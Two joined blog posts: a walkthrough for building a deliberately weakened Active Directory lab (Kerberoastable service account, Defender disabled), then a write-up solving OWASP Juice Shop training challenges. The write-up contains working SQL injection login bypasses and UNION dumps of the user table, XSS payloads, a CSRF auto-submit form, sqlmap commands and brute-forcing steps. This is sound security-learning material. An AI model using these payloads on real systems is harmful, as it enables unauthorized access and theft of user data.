On the right side there is a disc icon, click it and select choose a disk file and choose your server ISO. If you aren\u0026rsquo;t sure which ISO is which. The server ISO file will have SERVERESSENTIALS in the name.\nLeave the Network set to NAT and click ok. Go ahead and start the machine. It asked me to select the start-up disk so I changed that from the default GuestAdditons.iso to the Windows Server ISO and click start.\nSelect your language information and click Next.\nThen click Install Now.\nSelect I don't have a licence key and Next. Accept the license terms and click Next again. Select the Custom: Install Windows only (advanced).\nOn the Where do you want to install Windows window select New and Apply then click Next and wait for the install to finish.\nWhen it finishes it asks you to set a password for the Administrator account. I set mine to P@$$w0rd! but as this is your own virtual environment you can set it to whatever you wish as long as you remember it! Click finish to finally get to the Windows login. It asks you to press ctrl+alt+delete to unlock. To do this on VirtualBox go to Input then Keyboard and select Insert Ctrl+Alt+Del.\nIf you are using VMWare you may have to setup VMWare Tools here to get a properly sized screen. The thing I love about VirtualBox is that I can just select the display size within the running machine settings and VirtualBox resizes properly without the need to install Tools usually.\nNext click Start and type in Computer. Select where it says View your PC name. Here you want to scroll down and select Rename this PC and name it whatever you want and restart.\nAfter you log back into Windows the Server Manager should open. If it does not go ahead and start it up. Next you\u0026rsquo;ll want to go to Manage and Add Roles and Features.\nSelect Next here. Keep it at the default Role-based or feature-based installation and click Next. Select Next again. On Server Roles you want to select Active Directory Domain Services, click Add Features and select Next. Select Next again. Select Next again and then Install.\nNow a flag will appear at the top and selecting it will alert us to the fact that we now have to Promote this server to a domain controller. So go ahead and select that now.\nSelect Add a new forest and give it a Root domain name of your choosing and select Next. Give it a password and click Next. Click Next till you get to the option to Install and select it.\nSetting Up the User Machines For this part you will want to repeat the entire process at least once so that you have at least two client machines. Just like before if you are using VirtualBox go to Machine and New and set it like below the select Create.\nAgain change the size to 60GB and the other settings can stay at their defaults then click Create. Right click and select Settings then System and uncheck that floppy from the boot order. Then select Storage then Empty and the disc icon to Choose a disk file. Select the CLIENT ISO file this time and click OK.\nStart the machine and select the CLIENT ISO file again if prompted to select a start-up disk. Check that the language settings are how you want them and select Next then Install Now. Check the box to accept the terms and click Next. Select Custom: Install Windows only (advanced), this brings you to a new window to choose where you want to install Windows. Click New and Apply then Next after its done making the partitions.\nAfter it restarts you will need to select a region and keyboard layout. Once you get the option to sign in you\u0026rsquo;ll want to click Domain join instead.\nGive it a name and click Next. Give it a password, here I just used P@$$w0rd1 to make it easier to remember, then click Next. Fill out the security questions with whatever you wish and click Next. Click No at this next screen. Change everything to No if you like on the privacy settings page and then click Accept.\nAgain you may have to install Tools if you are using VMWare. After it finishes loading the Windows desktop you will want to click Start and search computer then select View your PC name. Scroll down to Rename this PC and give it a name of your choosing and reboot.\nDo this all again for at least one more Windows 10 client before moving onto the next section.\nSetting Up Users, Groups, and Policies Start up your domain controller machine and login. Open up the Server Manager if it does not start automatically. Next select Tools from the menu on the right side and Active Directory Users and Computers from that drop down menu.\nExpand the domain controller list and you will see the default directories Builtin, Computers, Domain Controllers, ForeignSecurityPrincipals, Managed Service Accounts, and Users.\nThe next step is optional and is more of a quality of life step:\nWe want to create a new one for groups so right click the domain controller and select New and Organizational Unit and name it Groups then click OK. The click on Users and move everything that has the Type as Security Group - * to the newly created Groups folder. Now we will want to add the users from our client machines into the Users directory. To do this you will want to click anywhere on the right in the empty space under Administrator and Guest then hover over New and select User.\nAdd the user logins you made for the clients here for the First name and Last name fields and come up with a naming convention that will be consistent for the User Login name field, ie. first initial and last name. Click Next and give the user a password. Note you can set the password to never expire in this virtual test environment but its not something you would realistically want to do. Repeat for however many users you wish to add.For one of the users be sure to make a copy of the Administrator user to easily create a user that will be the domain administrator.\nIf you are building this lab for testing purposes you may choose to create a copy of the domain administrator account and make it a SQL Service account. Just set the First Name as SQL and Last as Service and the login name as SQLService. Then right click the SQL Service user and give it a description that tells the password and click Apply and figure out how you can view that description without being a domain administrator as descriptions often contain valuable information.\nNext lets set up a file share. Close this window and select File and Storage Services under Server Manager.\nClick on Shares and at the top right where it says TASKS click there and then New Share.\nLeave it at the default SMB Share - Quick and click Next. Click Next again and now give it a Share name and click Next until you get the option to Create. Select Create then close once it finishes. Most domain controllers have shares so doing this opens the ports and gives us another attack vector to play around with.\nNext we want to create a service principal name(SPN) so we can play around with Kerberoasting attack so we need to open a command prompt as Administrator. Enter the following on command prompt:\nsetspn -a DOMAINCONTROLLERPCNAME/SQLService.FORESTNAME:60111 FORESTNAME\\SQLService\nThen:\nsetspn -T FORESTNAME -Q */*\nAs this is a testing environment we will want to make things easier and disable Windows Defender for now. Click start then type in Group Policy Management until it pops up then right click it and select run as Administrator.\nExpand the Forest and Domains then right click the domain and select Create a GPO in this domain, and Link it here...\nName it Disable Windows Defender and click OK. Now expand this tree so you see the newly created Disable Windows Defender then right click it and select Edit. Next Expand Policies, then Administrative Templates, then Windows Components and finally click Windows Defender Antivirus. Double click on Turn off Windows Defender Antivirus and select Enabled then Apply and OK.\nBy default the Enforced is set to No. Right click this and select Enforced to change this to Yes.\nJoining Our Machines to the Domain Start up one of the Windows 10 Clients and login. Open up File Explorer and navigate to the C: drive. Create a new directory here called Share.\nRight click the newly created Share directory and select Properties. Click the Sharing tab and the click Share. Click Share in the window that pops up and select Yes, turn on network discovery and file sharing for all public networks then Done.\nClose that out and go back to your domain controller virtual machine. Open up the Command Prompt and type ipconfig to get the IP of the domain controller. Once you have the IP switch back to the Windows 10 client and right click the Network icon at the bottom right then select Open Network and Internet Settings. Select Change adapter options and there should be a single Ethernet here. Right click it and select Properties then double click on the Internet Protocol Version 4(TCP/IPv4). Leave the IP address to obtain automatically but switch Obtain DNS server address automatically to Use the following DNS server addresses and set the Preferred DNS server to that domain controller IP you just looked up with ipconfig then click OK on this window and the next.\nNext click start and type domain and you should see the option Access work or school. Select it and click Connect then at the bottom you want to click Join this device to a local Active Directory domain.\nEnter the domain name you chose here.\nNote If you are using VirtualBox like me this is where you discover that leaving the virtual machines setting to NAT gives them all the same IP. So you must open VirtualBox and select File, then Preferences, then Network and click the button to add a new NAT network. Then right click each of your machines and go to Settings then Network and change the NAT to NAT Network. The name field should update to the newly created NAT network but change it if it does not and click OK. Next it asks for a user name and password. Type Administrator for the user name and whatever password you set for that account at the start. Click Skip at the next window and then Restart Now.\nAfter it boots back up to the login select Other user and enter the user information you setup on the domain controller using the first name initial and last name scheme and make sure its successful.\nSign out then sign in as the user administrator DOMAIN\\administrator. As we want to set the user to be an administrator on the local machine. Right click on start and select Computer Management. Click Local Users and Groups then double click Groups. Double click Administrators and then Add and type the user name into Enter the object names to select and make sure to click Check Names before hitting ok to make sure it found the user. Click Apply and OK.\nDo the same for your other Windows 10 client machines. Making sure that the local user is an administrator of that machine and that your main user is an admin on all machines.\nLastly go back to your Windows Server 2019 machine and open Active Directory Users and Computers and select Computers. You may have to click refresh but the Windows 10 client computers should all appear here now.\nCongratulations! Your own active directory lab is fully set up.

I remembered it existed but not where and forgot that it was actually a part of the challenges so I took to google and did a quick search for its location.\nhttps://exampleapp.herokuapp.com/#/score-board\nFirst challenge complete: Score Board (Find the carefully hidden \u0026lsquo;Score Board\u0026rsquo; page.)\nBonus Payload Category: XSS\nThis challenge is as simple as adding the provided payload to the search function.\n\u0026lt;iframe width=\u0026quot;100%\u0026quot; height=\u0026quot;166\u0026quot; scrolling=\u0026quot;no\u0026quot; frameborder=\u0026quot;no\u0026quot; allow=\u0026quot;autoplay\u0026quot; src=\u0026quot;https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076\u0026amp;color=%23ff5500\u0026amp;auto_play=true\u0026amp;hide_related=false\u0026amp;show _comments=true\u0026amp;show_user=true\u0026amp;show_reposts=false\u0026amp;show_teaser=true\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;\nBully Chatbot Category: Miscellaneous\nTo access the Chatbot I created a new account on the site then opened up the menu and selected the support chat. I really just had to send any message containing the words \u0026ldquo;coupon code\u0026rdquo; enough times for it to give up and hand over a code.\nConfidential Document Category: Sensitive Data Exposure\nThe hints:\nSomewhere in the application you can find a file that contains sensitive information about some - potentially hostile - takeovers the Juice Shop top management has planned.\n-Analyze and tamper with links in the application that deliver a file directly.\n-The file you are looking for is not protected in any way. Once you found it you can also access it.\nIn the About Us section I found a link \u0026ldquo;Check out our boring terms of use if you are interested in such lame stuff.\u0026rdquo; that opened up a download window to get a legal.md document. I opened up burp suite and intercepted this request there and noticed the GET request was to a ftp server.\nSo I checked to see if something simple like https://exampleapp.herokuapp.com/ftp would work and it did!\nDOM XSS Category: XSS\nPerform a DOM XSS attack with \u0026lt;iframe src=\u0026quot;javascript:alert(xss)\u0026quot;\u0026gt;.\nThis is another task where I was able to simply just copy the script provided and paste it into the search function to complete this challenge.\n\u0026lt;iframe src=\u0026quot;javascript:alert(xss)\u0026quot;\u0026gt;\nError Handling Category: Security Misconfiguration\nProvoke an error that is neither very gracefully nor consistently handled.\nThis one has so many ways to trigger it that I ended up completing it and didn\u0026rsquo;t even notice.\nExposed Metrics Category: Sensitive Data Exposure\nFind the endpoint that serves usage data to be scraped by a popular monitoring system.\nThe hints pretty much give this one away. A quick read through and the name of this challenge made it obvious that the path I was looking for was /metrics/.\nGuessing the path is probably just as quick as taking the RTFM route via https://prometheus.io/docs/introduction/first_steps\nMissing Encoding Category: Improper Input Validation\nRetrieve the photo of Bjoern\u0026rsquo;s cat in \u0026ldquo;melee combat-mode\u0026rdquo;.\nLuckily this was as easy as url encoding the #\u0026rsquo;s to %23 because that emoji really had me scratching my head for a bit there.\nhttps://www.eso.org/~ndelmott/url_encode.html\nOutdated Allowlist Category: Unvalidated Redirects\nFor the reading: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html\nLet us redirect you to one of our crypto currency addresses which are not promoted any longer.\nFor this one I inspected the page to open the debugger window so that I could have a look around the Javascript files to try to find the crypto currency address. The first place I checked was main-es2018.js and I simply did a search for redirect which had 20 results to check through but the answer was there and I simply had to paste this blockchain.info link to the app address.\nhttps://exampleapp.herokuapp.com/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm\nPrivacy Policy Category: Miscellaneous\nRead our privacy policy.\nThis simply required me to be logged in and go to Account \u0026gt; Privacy \u0026amp; Security \u0026gt; Privacy Policy.\nRepetitive Registration Category: Improper Input Validation\nFollow the DRY principle while registering a user.\nThe DRY (Don\u0026rsquo;t Repeat Yourself) Principle states:\nEvery piece of knowledge must have a single, unambiguous, authoritative representation within a system.\nThis challenge required me to turn on burp and foxyproxy to catch a legit registration attempt and change the value of passwordRepeat then forward the request.\nZero Stars Category: Improper Input Validation\nGive a devastating zero-star feedback to the store.\nReading: https://cwe.mitre.org/data/definitions/20.html\nI found the customer feedback option as the first option on the menu. This page allows us to give a feedback of 1 to 5. Getting around this is as simple as intercepting the request in burp and changing the rating to 0.\n2 * Challenges Admin Section Category: Broken Access Control\nAccess the administration section of the store.\nThe quick and easy first check was to try to guess the admin page location. I tried https://exampleapp.herokuapp.com/#/admin but no luck there so I tried administration instead and got a 403 You are not allowed to access this page!. Also turns out you can find this path from the main.js as well if guessing failed.\nI have found the page but I still need to login as the administrator to complete this challege. Going to the login page I see that we need the administrators email not username to login. So I go back and look through the shop looking for the complete email address somewhere or at least an @email to just have to guess the name.\nOn the review for the product Apple Juice contains a review from the admin themselves!\nadmin@juice-sh.op\nThe category for this challenge is injection but there\u0026rsquo;s another challenge to log in without using injection so its time to brute force the login page instead and complete both challenges in one go. I first attempted this with hydra but soon discovered that hydra is does not work because this is a client-side AngularJS route. So its time to try with burp! I captured the request and sent it over to intruder. I set the position to the password and on payload options I loaded a smaller file from seclist called best1050.txt as I only have the free version of burp and it doesn\u0026rsquo;t load rockyou. Running this attack on the free version is a bit slow but it works and I get the password.\nNow to just login with the credentials admin@juice-sh.op:admin123 and head over to the previously found /#/administration page to complete this challenge.\nDeprecated Interface Category: Security Misconfiguration\nUse a deprecated B2B interface that was not properly shut down.\nFor this I had to do some googling to understand what B2B integration was about and came across this explanation \u0026ldquo;It allows them to work and trade more effectively with their customers, suppliers and business partners by automating key business processes.\u0026rdquo; from www.ibm.com. So I headed over to the complaint page on the menu and took a look at what file types were accepted which turned out to be .pdf and .zip files. Inspecting this and heading back to debugger to take a look at the main-es2018.js and doing a search for zip revealed that .xml was also accepted.\nI didn\u0026rsquo;t have any random .xml files around so I used touch test.xml to create one and then selected browse on the site and chose all file types so that I could select this file and upload it.\nFive-Star Feedback Category: Broken Access Control\nGet rid of all 5-star customer feedback.\nSounds like an admin task, so I headed back to the administration page to take a look and sure enough the customer feedback section was there with only one 5-star feedback. All I had to do was hit delete on this one and the challenge completed.\nLogin Admin Category: Injection\nLog in with the administrator\u0026rsquo;s user account.\nSee Admin Section challenge solve.\nAnother method is with injection like the category suggests. Log in with Email ' or 1=1-- and any Password which will authenticate the first entry in the Users table which usually happens to be the administrator.\nLogin MC SafeSearch Category: Sensitive Data Exposure\nLog in with MC SafeSearch\u0026rsquo;s original user credentials without applying SQL Injection or any other bypass.\nThe hints for this supply a link to a video by MC SafeSearch at https://www.youtube.com/watch?v=v59CX2DiX0Y called \u0026ldquo;Protect Ya\u0026rsquo; Passwordz\u0026rdquo;. Watch this video to learn that MC used the name of his dog \u0026ldquo;Mr. Noodles\u0026rdquo; as a password but changed \u0026ldquo;some vowels into zeroes\u0026rdquo;.\nAll I had to do was log in with email mc.safesearch@juice-sh.op, as we already know what email addresses look like for this site and could easily guess the name, and password Mr. N00dles to solve this challenge.\nMeta Geo Stalking Category: Sensitive Data Exposure\nDetermine the answer to John\u0026rsquo;s security question by looking at an upload of him to the Photo Wall and use it to reset his password via the Forgot Password mechanism.\nThe title hints toward geo data so I headed over to the photo wall and downloaded the picture by jOhNny. I then ran exiftool to get the GPS coordinates.\nAnd then did a google search of these coordinates to find a name that could be the security question.\nIt took quite a few attempts but I eventually found it to be Daniel Boone National Forest and was able to login by going to \u0026ldquo;forgot your password?\u0026rdquo; and using john@juice-sh.op for the email, Daniel Boone National Forest for the security question, and resetting the password.\nPassword Strength Category: Broken Authentication\nLog in with the administrator\u0026rsquo;s user credentials without previously changing them or applying SQL Injection.\nSee Admin Section challenge solve.\nSecurity Policy Category: Miscellaneous\nBehave like any \u0026ldquo;white-hat\u0026rdquo; should before getting into the action.\nFor this I attempted to run gobuster and dirbuster against the site to no success. So I loaded up OWASP\u0026rsquo;s very own ZAP and was able to find a file at https://exampleapp.herokuapp.com/.well-known/security.txt. I went to that address and the challenge completed but out of curiosity I looked up what this file was about anyway and heres the link for reference: https://securitytxt.org/.\nView Basket Category: Broken Access Control\nView another user\u0026rsquo;s shopping basket.\nI headed over to the main page and added an item to the basket then selected the basket. On the basket page I inspected the page and went to the session storage where I found the item total and bid. Bid must hold the user id value so I changed the 1 to 2 and reloaded the page to complete the challenge.\nVisual Geo Stalking Category: Sensitive Data Exposure\nDetermine the answer to Emma\u0026rsquo;s security question by looking at an upload of her to the Photo Wall and use it to reset her password via the Forgot Password mechanism.\nAt first I attempted a reverse image search on google but saw quickly that that was not the way to go with this. Looking closer at the image itself I noticed the ITsec logo in a window on the left side.\nUsing this (case sensitive) as the security question I was able to reset her password and complete the challenge.\nWeird Crypto Category: Cryptographic Issues\nInform the shop about an algorithm or library it should definitely not use the way it does.\nWhen completing the Meta Geo Stalking challenge I got a password hash back in the response from the burp request. Using hash-identifier I found out that this has is only an unsalted MD5. Taking this hash to crackstation.net easily got me the password of john@juice-sh.op as test1234.\nThe challenge says to inform the shop about the algorithm so to complete this challenge I had to go to Customer Feedback on the menu and simply leave a comment that said MD5 and solve the captcha to submit.\nReflected XSS Unavailable on the Heroku environment.\n3 * Challenges API-only XSS Unavailable on the Heroku environment.\nAdmin Registration Category: Improper Input Validation\nRegister as a user with administrator privileges.\nFor this challenge all I had to do was submit a POST request to the API like so:\ncurl -d '{\u0026quot;email\u0026quot;:\u0026quot;admin\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;admin\u0026quot;,\u0026quot;role\u0026quot;:\u0026quot;admin\u0026quot;}' -H 'Content-Type: application/json' https://exampleapp.herokuapp.com/api/users/\n{\u0026#34;status\u0026#34;:\u0026#34;success\u0026#34;,\u0026#34;data\u0026#34;:{\u0026#34;username\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;deluxeToken\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;lastLoginIp\u0026#34;:\u0026#34;0.0.0.0\u0026#34;,\u0026#34;profileImage\u0026#34;:\u0026#34;/assets/public/images/uploads/defaultAdmin.png\u0026#34;,\u0026#34;isActive\u0026#34;:true,\u0026#34;id\u0026#34;:21,\u0026#34;email\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;role\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;updatedAt\u0026#34;:\u0026#34;2021-09-24T13:43:00.474Z\u0026#34;,\u0026#34;createdAt\u0026#34;:\u0026#34;2021-09-24T13:43:00.474Z\u0026#34;,\u0026#34;deletedAt\u0026#34;:null}} Bjoern\u0026rsquo;s Favorite Pet Category: Broken Authentication\nReset the password of Bjoern\u0026rsquo;s OWASP account via the Forgot Password mechanism with the original answer to his security question.\nThe hint for this suggests looking up Bjorn. I quickly found he has a youtube channel that looks interesting and the information I need is likely there given the that the playlist is called \u0026ldquo;OWASP Juice Shop\u0026rdquo;, https://www.youtube.com/playlist?list=PLV9O4rIovHhO1y8_78GZfMbH6oznyx2g2. But there are 110 videos here! I started at the bottom of the list as this is likely to be an early recording and going through the titles to check for ones that stand out or seem like they might hold the key I eventually came across https://www.youtube.com/watch?v=Lu0-kDdtVf4 (81 on the list).\nThis is the introduction video to Juice Shop. Around 4 mins into the video he creates an account bjoern@owasp.org and chooses Name of your favorite pet? as his security question with the answer being Zaya.\nWith this information I headed to the login page and chose \u0026ldquo;Forgot your password?\u0026rdquo; and tested the information from the video. Sure enough this account still existed using this information.\nCAPTCHA Bypass Category: Broken Anti Automation\nSubmit 10 or more customer feedbacks within 10 seconds.\nI already ran into the CAPTCHA section early on in the Customer Feedback section so I immediately head there. Next I inspect the page and go to the network tab to check for the CAPTCHA request and found https://example.herokuapp.com/rest/captcha/.\ncaptchaId\t2 captcha\t\u0026#34;6*1+8\u0026#34; answer\t\u0026#34;14\u0026#34; When I submit feedback I see a POST call to /api/Feedback with the information:\ncaptcha\t\u0026#34;14\u0026#34; captchaId\t2 comment\t\u0026#34;test (***in@juice-sh.op)\u0026#34; rating\t1 UserId\t1 So I open up Burp and capture a request to the /api/Feedback and send it to repeat to simply spam send and complete this challenge.\nCSRF Category: Broken Access Control\nChange the name of a user by performing Cross-Site Request Forgery from another origin.\nFor this challenge I used Real-Time HTML Editor at http://htmledit.squarefree.com/ and ran the following code:\n\u0026lt;form action=\u0026#34;https://exampleapp.herokuapp.com/profile\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;username\u0026#34; value=\u0026#34;CSRF\u0026#34;/\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;/\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt;document.forms[0].submit();\u0026lt;/script\u0026gt; The challenge completed without the successful message I usually get but I could also verify its success by going to https://exampleapp.herokuapp.com/profile and seeing that the username and indeed been changed to CSRF.\nClient-side XSS Protection Unavailable on the Heroku environment.\nDatabase Schema Category: Injection\nExfiltrate the entire DB schema definition via SQL Injection.\nFrom an earlier challenge (DOM XSS) I knew that there was no input sanitization on the “Search” field, so I decided to start there. Running sqlmap -u https://exampleapp.herokuapp.com/rest/products/search?q= \u0026ndash;dbs \u0026ndash;level=3 \u0026ndash;risk=3 quickly tells us this is an SQLite database we are dealing with.\nsqlmap identified the following injection point(s) with a total of 1383 HTTP(s) requests: --- Parameter: q (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: q=\u0026#39;) AND 6959=6959 AND (\u0026#39;KGhU\u0026#39; LIKE \u0026#39;KGhU --- [19:46:31] [INFO] testing SQLite [19:46:31] [INFO] confirming SQLite [19:46:32] [INFO] actively fingerprinting SQLite [19:46:32] [INFO] the back-end DBMS is SQLite back-end DBMS: SQLite [19:46:32] [WARNING] on SQLite it is not possible to enumerate databases (use only \u0026#39;--tables\u0026#39;) Cool its vulnerable. I was able to rerun sqlmap with --tables and retrieve the database SQLite_masterdb as well as all the table but the challenge did not complete. Nonetheless I made a copy of the results and saved it some place ill remember in case its useful later on. Doing this the manual way really took some time as at first I thought we had to enumerate all 20 tables that sqlmap found but apparently it was just 9.\nhttps://exampleapp.herokuapp.com/rest/products/search?q=qwert')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--\nDeluxe Fraud Category: Improper Input Validation\nObtain a Deluxe Membership without paying for it.\nI headed to https://exampleapp.herokuapp.com/#/payment/deluxe and started up Burp to see if I could get an easy win intercepting a request but didn\u0026rsquo;t find anything useful there. So I inspected the pay using wallet button and removed both codes that mentioned disabled (mat-button-disabled and disabled=\u0026quot;true\u0026quot;). After that I clicked the now enabled button and continue then checked the network tab of devtools. There is a POST request sent, which only contains one parameter in the request payload, \u0026ldquo;paymentMode\u0026rdquo;, which is set to \u0026ldquo;wallet\u0026rdquo;. I right clicked the POST request itself on the network tab list and selected to edit and resent. I changed the \u0026quot;wallet\u0026quot; value to just \u0026quot;\u0026quot; and send.\nForged Feedback Category: Broken Access Control\nPost some feedback in another users name.\nI completing this one accidentally while doing the CAPTCHA bypass challenge simply by being logged in as one of the users accounts that I had gained access to earlier on.\nThe proper way to do this is to inspect the page and find the hidden element under feedback-form.\n\u0026lt;input id=\u0026quot;userId\u0026quot; class=\u0026quot;ng-untouched ng-pristine ng-valid\u0026quot; hidden=\u0026quot;\u0026quot;\u0026gt;\nRemove the hidden and you can change the userId to complete this challenge.\nForged Review Category: Broken Access Control\nPost a product review as another user or edit any user\u0026rsquo;s existing review.\nFor this one I selected an item and created a review that simply said test. As I was not logged in the user for this review was logged as Anonymous. Inspecting the page and checking the Network tab I found the POST request that was sent. I right clicked this request and selected to edit and resent and changed the request body to {\u0026quot;message\u0026quot;:\u0026quot;test\u0026quot;,\u0026quot;author\u0026quot;:\u0026quot;admin@juice-sh.op\u0026quot;} and hit send.\nThis actually didn\u0026rsquo;t work so I created an account and logged in then repeated the process and successfully completed it this time.\nGDPR Data Erasure Category: Broken Authentication\nLog in with Chris\u0026rsquo; erased user account.\nFor this challenge I tried using \\' or deletedAt IS NOT NULL-- as the username with any password knowing that this small application built specifically for testing was likely to have Chris\u0026rsquo; account as the only deleted account and sure enough this worked and completed the challenge.\nAs this was not the way they likely wanted me to complete this challenge I went back to the SQL injection method to find the proper email address for Chris. By using qwert')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users-- at /rest/products/search I successfully get the email chris.pike@juice-sh.op.\nFull address: https://exampleapp.herokuapp.com/rest/products/search?q=qwert%27))%20UNION%20SELECT%20id,%20email,%20password,%20%274%27,%20%275%27,%20%276%27,%20%277%27,%20%278%27,%20%279%27%20FROM%20Users--\nWith that I just need to login with the email as chris.pike@juice-sh.op'-- and any password.\nLogin Amy Category: Sensitive Data Exposure\nLog in with Amy\u0026rsquo;s original user credentials. (This could take 93.83 billion trillion trillion centuries to brute force, but luckily she did not read the \u0026ldquo;One Important Final Note\u0026rdquo;)\nGoogling either hints: \u0026ldquo;This could take 93.83 billion trillion trillion centuries\u0026rdquo; or \u0026ldquo;One Important Final Note\u0026rdquo; comes up with a link related to password haystacks, https://www.grc.com/haystack.htm?id.\nThis site gives two password examples and asks which we think is the more difficult to crack. The answer being D0g...................... As the more hints section tells us this Amy is meant to be the Futurama Amy whose husband is named Kif, simply attempting amy@juice-sh.op and replacing the strong password with her husbands name K1f..................... succeeds in logging in and completing this challenge.\nLogin Bender Category: Injection\nLog in with Bender\u0026rsquo;s user account.\nAs the category for this is injection I attempted to login as bender@juice-sh.op'-- with any password and it worked. Or alternatively decode the MD5 passwords we found from the SQL Injection vulnerability found at /rest/products/search\nLogin Jim Category: injection\nLog in with Jim\u0026rsquo;s user account.\nThe same injection method used on Bender\u0026rsquo;s account works on Jim. Simply change the login email to jim@juice-sh.op'-- and again use anything for the password. Or alternatively decode the MD5 passwords we found from the SQL Injection vulnerability found at /rest/products/search\nManipulate Basket Category: Broken Access Control\nPut an additional product into another user\u0026rsquo;s shopping basket.\nFor this one I had to be logged in as any user and inspect the network traffic while adding an item to the cart. I selected to edit and resend the POST request to /api/BasketItems. Attempting to edit the BasketId and send got me an unauthorized 401 response.\nAdding another BasketId to also add the item to another users account however did succeed. {\u0026quot;ProductId\u0026quot;:24,\u0026quot;BasketId\u0026quot;:\u0026quot;2\u0026quot;,\u0026quot;quantity\u0026quot;:1,\u0026quot;BasketId\u0026quot;:\u0026quot;3\u0026quot;}\nPayback Time Category: Improper Input Validation\nPlace an order that makes you rich.\nTo complete this one I simply had Burp Suite on while I accessed the basket and noticed when I changed the quantity Burp made a PUT request to /api/BasketItems/13 with \u0026quot;quantity\u0026quot;:2. I simply changed this to a negative number on Burp before forwarding the request to get \u0026ldquo;rich\u0026rdquo;.\nPrivacy Policy Inspection Category: Security through Obscurity\nProve that you actually read our privacy policy.\nGoing to Account \u0026gt; Privacy and Security \u0026gt; Privacy Policy didn\u0026rsquo;t immediately complete this task so I started having a look around and noticed some areas highlight. So I inspected one of these areas to find a class=\u0026quot;hot\u0026quot;. There seems to be a code hidden here that starts with the site address, We may also, instruct you, to refuse all, reasonably necessary and responsibility.\nhttps://exampleapp.herokuapp.com/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility\nGoing to this greets us with a 404 Error: ENOENT: no such file or directory, stat '/app/frontend/dist/frontend/assets/private/thank-you.jpg'\nAnd going back to the scoreboard I see the challenge has indeed completed.\nProduct Tampering Category: Broken Access Control\nChange the href of the link within the OWASP SSL Advanced Forensic Tool (O-Saft) product description into https://owasp.slack.com.\nhttps://exampleapp.herokuapp.com/rest/products/search?q=o-saft we find the id is 9. I intercepted a request to /api/Products/9 in Burp and changed the request from GET to PUT, adding Content-Type: application/json, and finally {\u0026quot;description\u0026quot;: \u0026quot;\u0026lt;a href=\\\u0026quot;https://owasp.slack.com\\\u0026quot; target=\\\u0026quot;_blank\\\u0026quot;\u0026gt;More...\u0026lt;/a\u0026gt;\u0026quot;} to the body.\nPUT /api/products/9 HTTP/1.1 Host: exampleapp.herokuapp.com Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=wkhOtpIEsZUyHRumhYTZFyfySqtBi4fvSPHoMuaDtqni46fokSnxH5VuRYc7vS9KUZesDVig3S6ohOvtvvIx2TMnCPEs9RumbfoK; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0QHRlc3QuY29tIiwicGFzc3dvcmQiOiIwNWE2NzFjNjZhZWZlYTEyNGNjMDhiNzZlYTZkMzBiYiIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMS0wOS0yOSAyMjo1ODoyNC4xODEgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMS0wOS0yOSAyMzowNDo1NC4yNDcgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjMyOTYxNTcyLCJleHAiOjE2MzI5Nzk1NzJ9.UEhLYcuCkaSYF0JvRXS64GYNMIxQqE98Wi46VTSXResmOH8w5Bg0pxXmCW0mGmNJPTGKBptbTPG_v-t5GfO4E36TeqiLCbOol_MHN1ZnyPQoqSfPLALIA37iNw6BQZsSa7TyG8ixA6hFNjmcno44lq_qM9p_V2cbUdffHbfwt4A User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Upgrade-Insecure-Requests: 1 If-None-Match: W/\u0026#34;1f7-edRq59DDoY0qO1LQdUtOO3s+ErQ\u0026#34; Cache-Control: max-age=0 Te: trailers Connection: close Content-Type: application/json Content-Length: 84 {\u0026#34;description\u0026#34;: \u0026#34;\u0026lt;a href=\\\u0026#34;https://owasp.slack.com\\\u0026#34; target=\\\u0026#34;_blank\\\u0026#34;\u0026gt;More...\u0026lt;/a\u0026gt;\u0026#34;} Reset Jim\u0026rsquo;s Password Category: Broken Authentication\nReset Jim\u0026rsquo;s password via the Forgot Password mechanism with the original answer to his security question.\nSo the first step is obviously to go over to the login page and select Forgot Password. Inputting the email as jim@juice-sh.op tells us that his secret question is \u0026ldquo;Your eldest siblings middle name?\u0026rdquo;. So I must find out who Jim is, looking around reviews I see one by Jim for the product OWASP Juice Shop-CTF Velcro Patch stating \u0026quot;Looks so much better on my uniform than the boring Starfleet symbol.\u0026quot;\nIf you are like me and Starfleet isn\u0026rsquo;t a quick give away a simple Google search tells me this is related to Star Trek and that this account belongs to James T. Kirk. https://memory-alpha.fandom.com/wiki/James_T._Kirk reveals his only sibling as George Samuel Kirk.\nUse Samuel as the answer to the security question and change the password.\nUpload Size Category: Improper Input Validation\nUpload a file larger than 100 kB.\nFor this I headed over to Complaint where we already know 